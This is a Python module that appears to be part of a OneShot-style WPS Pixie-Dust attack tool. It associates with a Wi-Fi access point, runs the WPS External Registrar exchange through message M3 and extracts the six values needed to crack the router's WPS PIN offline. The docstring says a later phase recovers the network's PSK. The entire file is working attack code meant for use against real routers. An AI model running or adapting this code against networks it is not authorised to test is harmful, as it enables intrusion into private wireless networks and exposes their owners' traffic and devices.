#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Native WPS External Registrar engine — pure Python, stdlib only.

Replaces the parts of wpa_supplicant OneShot drives for a WPS PIN attack:
associate with the AP in MANAGED mode (nl80211, no monitor mode) and run the
EAPOL / EAP-WSC exchange acting as the WPS External Registrar (so the AP is
the Enrollee, which is what Pixie-Dust needs).

Layers:
  * WSC TLV codec + EAP/EAPOL framing (byte-compatible with hostap)
  * WpsRegistrar — the message state machine (M1 in, M2 out, M3 in ...)
  * Eapol transport over AF_PACKET (ETH_P_PAE 0x888E)
  * nl80211 CONNECT association (managed mode)

Phase 1 implements the exchange through M3 and collects the six Pixie-Dust
inputs (E-Nonce, PKE, PKR, AuthKey, E-Hash1, E-Hash2). Phase 2 extends the
state machine through M7 to recover the AP's PSK (see wps_connect_full).

The protocol/crypto/message layers are unit-tested in-process against a mirror
enrollee. The live nl80211 + AF_PACKET transport REQUIRES a rooted device with
a real Wi-Fi adapter and is NOT exercised by the test suite.
"""
import os
import socket
import struct

import wps_crypto as wc
from wps_crypto import (NONCE_LEN, derive_keys, authenticator)

# ---- WSC attribute IDs (wps_defs.h) ----
ATTR_AUTH_TYPE_FLAGS = 0x1004
ATTR_AUTHENTICATOR = 0x1005
ATTR_CONFIG_METHODS = 0x1008
ATTR_CONFIG_ERROR = 0x1009
ATTR_CONN_TYPE_FLAGS = 0x100d
ATTR_ENCR_TYPE_FLAGS = 0x1010
ATTR_DEV_NAME = 0x1011
ATTR_DEV_PASSWORD_ID = 0x1012
ATTR_E_HASH1 = 0x1014
ATTR_E_HASH2 = 0x1015
ATTR_ENCR_SETTINGS = 0x1018
ATTR_ENROLLEE_NONCE = 0x101a
ATTR_KEY_WRAP_AUTH = 0x101e
ATTR_MAC_ADDR = 0x1020
ATTR_MANUFACTURER = 0x1021
ATTR_MSG_TYPE = 0x1022
ATTR_MODEL_NAME = 0x1023
ATTR_MODEL_NUMBER = 0x1024
ATTR_NETWORK_KEY = 0x1027
ATTR_PUBLIC_KEY = 0x1032
ATTR_REGISTRAR_NONCE = 0x1039
ATTR_RF_BANDS = 0x103c
ATTR_R_HASH1 = 0x103d
ATTR_R_HASH2 = 0x103e
ATTR_R_SNONCE1 = 0x103f
ATTR_R_SNONCE2 = 0x1040
ATTR_SERIAL_NUMBER = 0x1042
ATTR_UUID_R = 0x1048
ATTR_VENDOR_EXT = 0x1049
ATTR_VERSION = 0x104a
ATTR_PRIMARY_DEV_TYPE = 0x1054
ATTR_ASSOC_STATE = 0x1002
ATTR_OS_VERSION = 0x102d

# ---- WPS message types ----
WPS_M1, WPS_M2, WPS_M3, WPS_M4 = 0x04, 0x05, 0x07, 0x08
WPS_M5, WPS_M6, WPS_M7, WPS_M8 = 0x09, 0x0a, 0x0b, 0x0c
WPS_WSC_ACK, WPS_WSC_NACK, WPS_WSC_DONE = 0x0d, 0x0e, 0x0f

# ---- EAP / EAPOL ----
EAPOL_VERSION = 2
EAPOL_TYPE_EAP = 0
EAPOL_TYPE_START = 1
EAP_CODE_REQUEST = 1
EAP_CODE_RESPONSE = 2
EAP_CODE_FAIL = 4
EAP_TYPE_IDENTITY = 1
EAP_TYPE_EXPANDED = 254
EAP_VENDOR_WFA = b'\x00\x37\x2a'
EAP_VENDOR_TYPE_WSC = 1
WSC_FLAGS_MF = 0x01
WSC_FLAGS_LF = 0x02
WSC_Start, WSC_ACK, WSC_NACK, WSC_MSG, WSC_Done, WSC_FRAG_ACK = (
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06)
ETH_P_PAE = 0x888E
REGISTRAR_IDENTITY = b'WFA-SimpleConfig-Registrar-1-0'
WFA_VENDOR_EXT = b'\x00\x37\x2a'   # WFA OUI inside WSC Vendor Extension
WPS_VERSION = 0x10
WPS_VERSION2 = 0x20


class WpsProtocolError(Exception):
    pass


# --------------------------------------------------------------------------
# WSC TLV codec
# --------------------------------------------------------------------------
def attr(attr_type, value):
    return struct.pack('>HH', attr_type, len(value)) + value


def attr_u8(attr_type, v):
    return attr(attr_type, struct.pack('B', v))


def attr_be16(attr_type, v):
    return attr(attr_type, struct.pack('>H', v))


def attr_be32(attr_type, v):
    return attr(attr_type, struct.pack('>I', v))


def parse_attrs(buf):
    """Parse WSC TLVs into a list of (type, value) preserving order/duplicates."""
    out = []
    i = 0
    while i + 4 <= len(buf):
        atype, alen = struct.unpack_from('>HH', buf, i)
        i += 4
        if i + alen > len(buf):
            break
        out.append((atype, buf[i:i + alen]))
        i += alen
    return out


def attrs_dict(buf):
    """First occurrence of each attribute as {type: value}."""
    d = {}
    for t, v in parse_attrs(buf):
        d.setdefault(t, v)
    return d


def _version_attrs():
    # Version (deprecated 0x10) + WFA Vendor Extension carrying Version2 (0x20).
    v2 = WFA_VENDOR_EXT + bytes([0x00, 0x01, WPS_VERSION2])   # subelem VERSION2
    return attr_u8(ATTR_VERSION, WPS_VERSION) + attr(ATTR_VENDOR_EXT, v2)


# --------------------------------------------------------------------------
# EAP / EAPOL framing
# --------------------------------------------------------------------------
def eapol_frame(eapol_type, payload=b''):
    return struct.pack('>BBH', EAPOL_VERSION, eapol_type, len(payload)) + payload


def eapol_start():
    return eapol_frame(EAPOL_TYPE_START)


def eap_packet(code, ident, type_and_data):
    length = 4 + len(type_and_data)
    return struct.pack('>BBH', code, ident, length) + type_and_data


def eap_identity_response(ident, identity):
    return eapol_frame(EAPOL_TYPE_EAP,
                       eap_packet(EAP_CODE_RESPONSE, ident,
                                  bytes([EAP_TYPE_IDENTITY]) + identity))


def eap_wsc_response(ident, op_code, message, flags=0):
    hdr = bytes([EAP_TYPE_EXPANDED]) + EAP_VENDOR_WFA + struct.pack('>I', EAP_VENDOR_TYPE_WSC)
    body = bytes([op_code, flags]) + message
    return eapol_frame(EAPOL_TYPE_EAP, eap_packet(EAP_CODE_RESPONSE, ident, hdr + body))


def parse_eapol(frame):
    """Return (eapol_type, payload) or raise on a short/garbage frame."""
    if len(frame) < 4:
        raise WpsProtocolError('short EAPOL frame')
    ver, etype, elen = struct.unpack_from('>BBH', frame, 0)
    return etype, frame[4:4 + elen]


def parse_eap(payload):
    """Return dict describing an EAP packet (identity request or WSC)."""
    if len(payload) < 4:
        raise WpsProtocolError('short EAP packet')
    code, ident, length = struct.unpack_from('>BBH', payload, 0)
    body = payload[4:length] if length <= len(payload) else payload[4:]
    info = {'code': code, 'id': ident}
    if not body:
        info['type'] = None
        return info
    etype = body[0]
    info['type'] = etype
    if etype == EAP_TYPE_IDENTITY:
        info['identity'] = body[1:]
    elif etype == EAP_TYPE_EXPANDED:
        # vendor(3) + vendor_type(4) + op_code(1) + flags(1) + message
        if len(body) >= 1 + 3 + 4 + 2:
            info['vendor'] = body[1:4]
            info['vendor_type'] = struct.unpack_from('>I', body, 4)[0]
            info['op_code'] = body[8]
            info['flags'] = body[9]
            msg = body[10:]
            if info['flags'] & WSC_FLAGS_LF:
                # 2-byte total length prefix on first fragment
                msg = msg[2:]
            info['message'] = msg
    return info


# --------------------------------------------------------------------------
# WPS Registrar message state machine
# --------------------------------------------------------------------------
class WpsRegistrar:
    """Builds/parses WSC messages as the External Registrar (AP = Enrollee)."""

    def __init__(self, registrar_mac, pin=None,
                 device_name=b'OneShot', manufacturer=b'OneShot',
                 model_name=b'OneShot', model_number=b'1', serial=b'12345678'):
        self.registrar_mac = registrar_mac          # 6 bytes
        self.pin = pin
        self.device_name = device_name
        self.manufacturer = manufacturer
        self.model_name = model_name
        self.model_number = model_number
        self.serial = serial

        self.dh_priv, self.pkr = wc.dh_keypair()     # our (registrar) DH keys
        self.nonce_r = os.urandom(NONCE_LEN)
        self.uuid_r = os.urandom(16)

        # filled from M1
        self.pke = None
        self.nonce_e = None
        self.enrollee_mac = None
        self.authkey = self.keywrapkey = self.emsk = None
        # filled from M3
        self.e_hash1 = self.e_hash2 = None
        # last message we sent / received (for the running Authenticator)
        self._last_recv = None
        self._last_sent = None

    # -- M1 (received from the AP/enrollee) --
    def process_m1(self, msg):
        a = attrs_dict(msg)
        if a.get(ATTR_MSG_TYPE) != bytes([WPS_M1]):
            raise WpsProtocolError('expected M1')
        self.pke = a[ATTR_PUBLIC_KEY]
        self.nonce_e = a[ATTR_ENROLLEE_NONCE]
        self.enrollee_mac = a[ATTR_MAC_ADDR]
        self.authkey, self.keywrapkey, self.emsk = derive_keys(
            self.pke, self.dh_priv, self.nonce_e, self.enrollee_mac, self.nonce_r)
        self._last_recv = msg

    # -- M2 (sent to the AP/enrollee) --
    def build_m2(self):
        body = (_version_attrs()
                + attr_u8(ATTR_MSG_TYPE, WPS_M2)
                + attr(ATTR_ENROLLEE_NONCE, self.nonce_e)
                + attr(ATTR_REGISTRAR_NONCE, self.nonce_r)
                + attr(ATTR_UUID_R, self.uuid_r)
                + attr(ATTR_PUBLIC_KEY, self.pkr)
                + attr_be16(ATTR_AUTH_TYPE_FLAGS, 0x003F)
                + attr_be16(ATTR_ENCR_TYPE_FLAGS, 0x000F)
                + attr_u8(ATTR_CONN_TYPE_FLAGS, 0x01)
                + attr_be16(ATTR_CONFIG_METHODS, 0x018C)
                + attr(ATTR_MANUFACTURER, self.manufacturer)
                + attr(ATTR_MODEL_NAME, self.model_name)
                + attr(ATTR_MODEL_NUMBER, self.model_number)
                + attr(ATTR_SERIAL_NUMBER, self.serial)
                + attr(ATTR_PRIMARY_DEV_TYPE, b'\x00\x01\x00\x50\xf2\x04\x00\x01')
                + attr(ATTR_DEV_NAME, self.device_name)
                + attr_u8(ATTR_RF_BANDS, 0x01)
                + attr_be16(ATTR_ASSOC_STATE, 0x0000)
                + attr_be16(ATTR_CONFIG_ERROR, 0x0000)
                + attr_be16(ATTR_DEV_PASSWORD_ID, 0x0000)
                + attr_be32(ATTR_OS_VERSION, 0x80000000))
        auth = authenticator(self.authkey, self._last_recv, body)
        msg = body + attr(ATTR_AUTHENTICATOR, auth)
        self._last_sent = msg
        return msg

    # -- M3 (received from the AP/enrollee) --
    def process_m3(self, msg):
        a = attrs_dict(msg)
        if a.get(ATTR_MSG_TYPE) != bytes([WPS_M3]):
            raise WpsProtocolError('expected M3')
        self.e_hash1 = a[ATTR_E_HASH1]
        self.e_hash2 = a[ATTR_E_HASH2]
        self._last_recv = msg

    def pixie_data(self):
        """The six values pixiewps needs, as uppercase hex (or None)."""
        if not all((self.pke, self.pkr, self.e_hash1, self.e_hash2,
                    self.authkey, self.nonce_e)):
            return None
        h = (lambda b: b.hex().upper())
        return {
            'pke': h(self.pke), 'pkr': h(self.pkr),
            'e_hash1': h(self.e_hash1), 'e_hash2': h(self.e_hash2),
            'authkey': h(self.authkey), 'e_nonce': h(self.nonce_e),
        }


# --------------------------------------------------------------------------
# EAPOL transport over AF_PACKET (live path — needs root + real adapter)
# --------------------------------------------------------------------------
class EapolSocket:
    """Send/receive EAPOL (EtherType 0x888E) frames on an interface."""

    def __init__(self, interface, peer_mac, timeout=5):
        self.interface = interface
        self.peer_mac = peer_mac
        self.sock = socket.socket(socket.AF_PACKET, socket.SOCK_DGRAM, socket.htons(ETH_P_PAE))
        self.sock.bind((interface, ETH_P_PAE))
        self.sock.settimeout(timeout)

    def send(self, frame):
        self.sock.sendto(frame, (self.interface, ETH_P_PAE, 0, 0, self.peer_mac))

    def recv(self):
        data, _ = self.sock.recvfrom(2048)
        return data

    def close(self):
        try:
            self.sock.close()
        except OSError:
            pass


# --------------------------------------------------------------------------
# nl80211 association (managed mode, no monitor) — live path
# --------------------------------------------------------------------------
NL80211_CMD_CONNECT = 46
NL80211_CMD_DISCONNECT = 48
NL80211_ATTR_IFINDEX = 3
NL80211_ATTR_MAC = 6
NL80211_ATTR_SSID = 52
NL80211_ATTR_AUTH_TYPE = 53
NL80211_ATTR_IE = 42
NL80211_ATTR_SOCKET_OWNER = 206
NL80211_AUTHTYPE_OPEN_SYSTEM = 0
ATTR_REQUEST_TYPE = 0x103a
WPS_REQ_TYPE_REGISTRAR = 0x02


def wsc_assoc_ie():
    """WSC IE for the (re)association request advertising an External Registrar."""
    body = (WFA_VENDOR_EXT
            + struct.pack('B', 0x04)                       # WSC IE type
            + attr_u8(ATTR_VERSION, WPS_VERSION)
            + attr_u8(ATTR_REQUEST_TYPE, WPS_REQ_TYPE_REGISTRAR))
    return bytes([0xDD, len(body)]) + body                 # element id 221 (vendor)


def associate(interface, bssid_bytes, ssid_bytes):
    """Associate in MANAGED mode via nl80211 NL80211_CMD_CONNECT (no monitor mode).

    Returns an open netlink socket that OWNS the connection (SOCKET_OWNER) — keep
    it open for the duration of the WPS exchange; closing it tears the link down.
    Raises OSError/Nl80211Error on failure. LIVE PATH — needs root + a real adapter.
    """
    import nl80211_scan as nl
    ifindex = socket.if_nametoindex(interface)
    sock = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, nl.NETLINK_GENERIC)
    sock.bind((0, 0))
    sock.settimeout(8)
    family_id, _ = nl._resolve_family(sock, 'nl80211')
    attrs = (nl._attr(NL80211_ATTR_IFINDEX, struct.pack('=I', ifindex))
             + nl._attr(NL80211_ATTR_MAC, bssid_bytes)
             + nl._attr(NL80211_ATTR_SSID, ssid_bytes)
             + nl._attr(NL80211_ATTR_AUTH_TYPE, struct.pack('=I', NL80211_AUTHTYPE_OPEN_SYSTEM))
             + nl._attr(NL80211_ATTR_IE, wsc_assoc_ie())
             + nl._attr(NL80211_ATTR_SOCKET_OWNER, b''))
    nl._send(sock, nl._genl_msg(family_id, NL80211_CMD_CONNECT, 10,
                                nl.NLM_F_REQUEST | nl.NLM_F_ACK, attrs))
    for _ in nl._read_until_done(sock):   # consume CONNECT ACK
        pass
    return sock


def _mac_bytes(bssid):
    return bytes(int(b, 16) for b in bssid.split(':'))


class WpsConnection:
    """High-level driver: associate + run the EAP-WSC registrar exchange.

    LIVE PATH. Requires root, a real Wi-Fi adapter, and that no other supplicant
    (NetworkManager / system wpa_supplicant) owns the interface.
    """

    def __init__(self, interface, bssid, ssid='', timeout=8):
        self.interface = interface
        self.bssid = bssid.upper()
        self.ssid = ssid or ''
        self.timeout = timeout

    def _own_mac(self):
        with open('/sys/class/net/{}/address'.format(self.interface)) as f:
            return _mac_bytes(f.read().strip())

    def _drive(self, reg, stop_after_m3):
        """Associate, then pump the EAP-WSC exchange. Returns the WpsRegistrar."""
        conn = associate(self.interface, _mac_bytes(self.bssid), self.ssid.encode())
        eapol = EapolSocket(self.interface, _mac_bytes(self.bssid), self.timeout)
        try:
            eapol.send(eapol_start())
            while True:
                etype, payload = parse_eapol(eapol.recv())
                if etype != EAPOL_TYPE_EAP:
                    continue
                info = parse_eap(payload)
                if info['code'] == EAP_CODE_FAIL:
                    break
                if info.get('type') == EAP_TYPE_IDENTITY and info['code'] == EAP_CODE_REQUEST:
                    eapol.send(eap_identity_response(info['id'], REGISTRAR_IDENTITY))
                    continue
                if info.get('type') != EAP_TYPE_EXPANDED:
                    continue
                msg = info.get('message', b'')
                mtype = attrs_dict(msg).get(ATTR_MSG_TYPE)
                if mtype == bytes([WPS_M1]):
                    reg.process_m1(msg)
                    eapol.send(eap_wsc_response(info['id'], WSC_MSG, reg.build_m2()))
                elif mtype == bytes([WPS_M3]):
                    reg.process_m3(msg)
                    eapol.send(eap_wsc_response(info['id'], WSC_NACK, b''))
                    break
            return reg
        finally:
            eapol.close()
            conn.close()   # SOCKET_OWNER -> closing tears down the association

    def pixie_dust(self):
        """Run M1..M3 and return the six pixiewps inputs (hex) or None."""
        reg = WpsRegistrar(self._own_mac())
        self._drive(reg, stop_after_m3=True)
        return reg.pixie_data()
